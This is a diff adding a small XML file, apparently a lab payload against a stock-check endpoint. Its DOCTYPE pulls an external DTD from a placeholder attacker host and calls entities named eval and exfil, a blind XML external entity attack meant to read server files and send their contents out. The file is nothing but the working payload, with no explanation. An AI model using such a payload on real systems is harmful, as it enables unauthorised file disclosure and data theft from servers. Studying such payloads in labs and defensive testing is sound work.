@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ATTACKER/evil_error.dtd"> %xxe;%eval;%exfil;]>
+<stockCheck>
+  <productId>2</productId>
+  <storeId>1</storeId>
+</stockCheck>
+
